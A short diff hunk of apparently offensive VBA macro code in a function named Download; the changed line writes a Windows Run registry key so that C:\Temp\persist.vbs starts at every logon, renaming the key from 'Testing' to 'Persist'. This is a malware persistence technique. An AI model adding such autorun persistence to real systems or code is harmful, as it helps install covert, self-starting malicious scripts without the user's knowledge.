@@ -94,7 +94,7 @@ Public Function Download() As Variant
     
     
     Set WshShell = CreateObject("WScript.Shell")
-    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Testing", "C:\Temp\persist.vbs", "REG_SZ"
+    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "C:\Temp\persist.vbs", "REG_SZ"
     Set WshShell = Nothing
 
     
